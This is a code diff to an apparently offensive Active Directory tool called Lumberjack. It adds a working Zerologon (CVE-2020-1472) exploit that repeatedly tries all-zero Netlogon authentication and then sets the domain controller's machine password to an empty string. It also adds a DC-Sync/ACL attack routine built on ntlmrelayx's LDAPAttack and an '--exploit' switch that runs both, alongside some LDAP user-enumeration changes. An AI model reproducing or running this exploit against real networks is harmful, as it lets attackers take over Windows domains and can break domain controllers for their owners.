@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 try:
 	#module imports
-	import argparse, re, sys, textwrap, socket, random, threading, json, os, ldapdomaindump
+	import argparse, re, sys, textwrap, socket, random, threading, json, os, ldapdomaindump, subprocess, hmac, hashlib
 
 	#other imports
 	from datetime import datetime, timedelta
@@ -29,10 +29,17 @@ try:
 	from impacket.nmb import NetBIOSTimeout, NetBIOSError	
 	from impacket.dcerpc.v5 import transport
 	from impacket import smbconnection
+	from impacket import crypto
+	from impacket.dcerpc.v5 import nrpc, epm
+	from impacket.dcerpc.v5.dtypes import NULL
+	from impacket.dcerpc.v5 import transport
 	from pyasn1.codec.der import decoder, encoder
 	from pyasn1.type.univ import noValue
 	from Cryptodome.Cipher import AES
 	from dns.resolver import NXDOMAIN
+	from binascii import hexlify, unhexlify
+	from subprocess import check_call
+	from struct import pack, unpack
 	from pyfiglet import Figlet
 	from binascii import hexlify, unhexlify
 	from subprocess import check_call
@@ -139,14 +146,15 @@ class EnumerateAD(object):
 	#Enumerate Active Directory Users		
 	def enumerateUsers(self):
 	
-		try:			
+		try:		
+			userObj = []	
 			self.status.update("[bold white]Finding Active Directory Users...")
 			sleep(1)
 			console.rule("[bold red]Domain Users")
 			#Search AD Users (Verbose)
 			if self.verbose:
 				self.total_entries = 0
-				self.entry_generator = self.conn.extend.standard.paged_search(self.dc_search[:-1], search_filter='(objectCategory=person)', attributes=ALL_ATTRIBUTES, size_limit=0)
+				self.entry_generator = self.conn.extend.standard.paged_search(self.dc_search[:-1], search_filter='(objectCategory=person)', attributes=['sAMAccountName'], size_limit=0)
 				for entry in self.entry_generator:
 					self.total_entries += 1
 					pprint(usernames)
@@ -154,17 +162,17 @@ class EnumerateAD(object):
 				print('')
 				console.print('[-] Found {0} user account(s)'.format(len(self.total_entries)), style = "info")
 			else:
-				self.total_entries = 0
-				self.entry_generator = self.conn.extend.standard.paged_search(self.dc_search[:-1], search_filter='(objectCategory=person)', size_limit=0)
-				for entry in self.entry_generator:
-					self.total_entries += 1
-					pprint (entry)
-
+				self.conn.search(self.dc_search[:-1], search_filter='(objectCategory=person)', attributes=['sAMAccountName'], size_limit=0)
+				for entry in self.conn.entries:
+					name = entry["sAMAccountName"][0]
+					userObj.append({
+						"User": name,
+					})
+				pprint (userObj)
 				console.print("[+] Success: Got all domain users ", style = "success")
 				print('')
-				console.print("[-] Found {0} domain users".format((self.total_entries)), style = "info")
+				console.print("[-] Found {0} domain users".format(len(self.conn.entries)), style = "info")
 				print('')
-				
 		except LDAPException as e:
 			console.print ("[-] Warning: No Users found", style = "warning")
 			pprint ("Error {}".format(e))
@@ -194,8 +202,8 @@ class EnumerateAD(object):
 				computerObjects.append({
 					"Computer": name,
 				})
-				pprint (computerObjects)
 				self.computers.append(entry)
+				pprint (computerObjects)
 				print('')
 				console.print ("[+] Success: Got all domain computers ", style = "success")
 				print('')
@@ -565,7 +573,116 @@ class EnumerateAD(object):
 		    with open('{0}-open-smb.json'.format(self.dc), 'w') as f:
 		        json.dump(self.smbBrowseable, f, indent=4, sort_keys=False)
 		    print('[ ' + colored('OK', 'green') + ' ] Wrote browseable shares to {0}-open-smb.json'.format(self.dc))
-    
+
+	def dcSync(self):
+
+		c = NTLMRelayxConfig()
+		c.addcomputer = 'idk lol'
+		c.target = self.dc
+
+		console.print ("[-] Starting DC-Sync Attack on {}".format(self.dUser), style="status")
+		console.print ("[-] Initialising LDAP connection to {}".format(self.dc), style="status")
+		
+		console.print ("[-] Initialising domainDumper()", style="status")
+		cnf = ldapdomaindump.domainDumpConfig()
+		cnf.basepath = c.lootdir
+		dd = ldapdomaindump.domainDumper(self.server, self.conn, cnf)
+		
+		console.print ("[-] Initializing LDAPAttack()", style="status")
+		la = LDAPAttack(c, self.conn)
+		la.aclAttack(self.dc, dd)	    
+"""
+Check if domain controller is vulnerable to the Zerologon attack aka CVE-2020-1472.
+Resets the DC account password to an empty string when vulnerable.
+"""
+class zeroLogon(object):
+
+	
+	def try_zero_authenticate(dc_handle, dc_ip, target_computer):
+	
+		# Connect to the DC's Netlogon service.
+		binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
+		rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
+		rpc_con.connect()
+		rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
+
+		# Use an all-zero challenge and credential.
+		plaintext = b"\x00" * 8
+		ciphertext = b"\x00" * 8
+
+		# Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
+		flags = 0x212fffff
+
+		# Send challenge and authentication request.
+		nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + "\x00", target_computer + "\x00", plaintext)
+		try:
+			server_auth = nrpc.hNetrServerAuthenticate3(
+				rpc_con, dc_handle + "\x00", target_computer + "$\x00",
+				nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
+						target_computer + "\x00", ciphertext, flags
+			)
+
+			# It worked!
+			assert server_auth["ErrorCode"] == 0
+			return rpc_con
+
+		except nrpc.DCERPCSessionError as ex:
+			# Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
+			if ex.get_error_code() == 0xc0000022:
+				return None
+			else:
+				 console.print ("[-] Unexpected error code returned from DC: {}".format(ex.get_error_code), style = "error")
+		except BaseException as ex:
+			console.print ("[-] Error {}".format(ex), style = "error")
+
+	def try_zerologon(dc_handle, rpc_con, target_computer):
+		
+		request = nrpc.NetrServerPasswordSet2()
+		request["PrimaryName"] = dc_handle + "\x00"
+		request["AccountName"] = target_computer + "$\x00"
+		request["SecureChannelType"] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
+		authenticator = nrpc.NETLOGON_AUTHENTICATOR()
+		authenticator["Credential"] = b"\x00" * 8
+		authenticator["Timestamp"] = 0
+		request["Authenticator"] = authenticator
+		request["ComputerName"] = target_computer + "\x00"
+		request["ClearNewPassword"] = b"\x00" * 516
+		return rpc_con.request(request)
+
+	def perform_attack(dc_handle, dc_ip, target_computer):
+	
+		# Keep authenticating until successful. Expected average number of attempts needed: 256.
+		rpc_con = None
+		for attempt in range(0, MAX_ATTEMPTS):
+			rpc_con = zeroLogon.try_zero_authenticate(dc_handle, dc_ip, target_computer)
+			if rpc_con is None:
+				status.update("[bold white]Performing authentication attempts...")
+			else:
+				break
+
+		if rpc_con:
+			sleep(1)
+			console.print("[+] Success: Target is vulnerable!", style = "success")
+			print('')
+			status.update("[bold white]Waiting...")
+			console.print("[-] Do you want to continue and exploit the Zerologon vulnerability? N/y", style = "warning")
+			exec_exploit = input().lower()
+			if exec_exploit == "y":
+				status.update("[bold white]Exploiting Zerologon vulnerability...")
+				print('')
+				result = zeroLogon.try_zerologon(dc_handle, rpc_con, target_computer)
+				if result["ErrorCode"] == 0:
+	
+					console.print("[+] Success: Exploit completed! Domain Controller's account password has been set to an empty string.", style = "success")
+				else:
+					console.print("[-] Warning: Non-zero return code, something went wrong. Domain Controller returned: {}".format(result["ErrorCode"]), style = "warning")
+			else:
+				console.print("[-] Aborted", style = "warning")
+				sys.exit(0)
+		else:
+			console.print("[-] Warning: Exploit failed, CVE-2020-1472 is probably patched on target domain", style = "warning")
+			sys.exit(1)
+	
 def titleArt():
 	f = Figlet(font="slant")
 	cprint(colored(f.renderText('Lumberjack'), 'cyan'))
@@ -602,8 +719,6 @@ def main():
 	parser.add_argument('-e', '--exploit', help='run exploit features: 1 = DC-Sync, 2 = zerologon')
 	parser.add_argument('-smb', '--smb', help='enumerate SMB shares', action='store_true')
 	parser.add_argument('-krb', help='kerberoasting', action='store_true')
-	parser.add_argument('identity' , action='store_true', help='domain\\username:password, attacker account with write access to target computer properties (NetBIOS domain name must be used!)')
-
 	parser.add_argument('-f', '--fuzz', type=str)
 	args = parser.parse_args()
 	
@@ -615,7 +730,10 @@ def main():
 
 	password = args.password
 	
-	if not password:
+	if args.exploit:
+		password = False
+
+	if not password and password is not False:
 		status.update("[bold white]Waiting...")
 		print("Enter a password:")
 		password = getpass()
@@ -631,32 +749,40 @@ def main():
 		args.enumerate = False
 		args.exploit = False
 	elif args.exploit:
+		args.connect = False
 		args.enumerate = False
 		args.fuzz = False
+		dc_name = args.netbios.rstrip("$")
 		
-	# Regex for invalid domain name or invalid ip address format
-	domainRE = re.compile(r'^(([a-zA-Z]{1})|([a-zA-Z]{1}[a-zA-Z]{1})|([a-zA-Z]{1}[0-9]{1})|([0-9]{1}[a-zA-Z]{1})|([a-zA-Z0-9][-_\.a-zA-Z0-9]{1,61}[a-zA-Z0-9]))\.([a-zA-Z]{2,13}|[a-zA-Z0-9-]{2,30}\.[a-zA-Z]{2,3})$')
-	domainMatch = domainRE.findall(args.dc)
+	if not args.exploit:		
+		#Regex for invalid domain name or invalid ip address format or no password
+		domainRE = re.compile(r'^(([a-zA-Z]{1})|([a-zA-Z]{1}[a-zA-Z]{1})|([a-zA-Z]{1}[0-9]{1})|([0-9]{1}[a-zA-Z]{1})|([a-zA-Z0-9][-_\.a-zA-Z0-9]{1,61}[a-zA-Z0-9]))\.([a-zA-Z]{2,13}|[a-zA-Z0-9-]{2,30}\.[a-zA-Z]{2,3})$')
+		domainMatch = domainRE.findall(args.dc)
 
-	ipRE = re.compile(r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
-	ipaddr = ipRE.findall(args.ip_address)
+		ipRE = re.compile(r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
+		ipaddr = ipRE.findall(args.ip_address)
 
-	pswdreg = "^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*#?&])[A-Za-z\d@$!#%*?&]{8,18}$"
-	match_re = re.compile(pswdreg)
-	pwdres = re.search(match_re, args.password)
+		pswdreg = "^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*#?&])[A-Za-z\d@$!#%*?&]{8,18}$"
+		match_re = re.compile(pswdreg)
+		pwdres = re.search(match_re, args.password)
 
-	#if invalid domain name and ip address format
-	if not domainMatch:
-		console.print("[-] Error: {} is not a valid domain name'".format(args.dc), style = "error")
-		sys.exit(1)
-	if not ipaddr:
-		console.print("[-] Error: {} is not a valid IP Address'".format(args.ip_address), style = "error")
-		sys.exit(1)
+		#if invalid domain name and ip address format
+		if not domainMatch:
+			console.print("[-] Error: {} is not a valid domain name'".format(args.dc), style = "error")
+			sys.exit(1)
+		if not ipaddr:
+			console.print("[-] Error: {} is not a valid IP Address'".format(args.ip_address), style = "error")
+			sys.exit(1)
 	
 	titleArt()
 	console.print("[+] Success: Lumberjack Started", style="success")
 	print('')	
 	start_time = datetime.now()
+	
+	if args.exploit == '1':
+		enumAD.dcSync()
+	if args.exploit == '2':
+		zeroLogon.perform_attack("\\\\" + dc_name, args.ip_address, dc_name)
 	
 	#Run main features
 	try:
@@ -673,10 +799,6 @@ def main():
 			enumAD.enumerateUsers()
 		elif args.fuzz is not False:
 			enumAD.searchRandom(args.fuzz)
-		elif args.exploit == '1':
-			enumAD.dcSync()
-	except RuntimeError as e:
-		pprint ("Error {}".format(e))
 	except KeyboardInterrupt:
 		console.print ("[-] Warning: Aborting", style = "warning")
 			
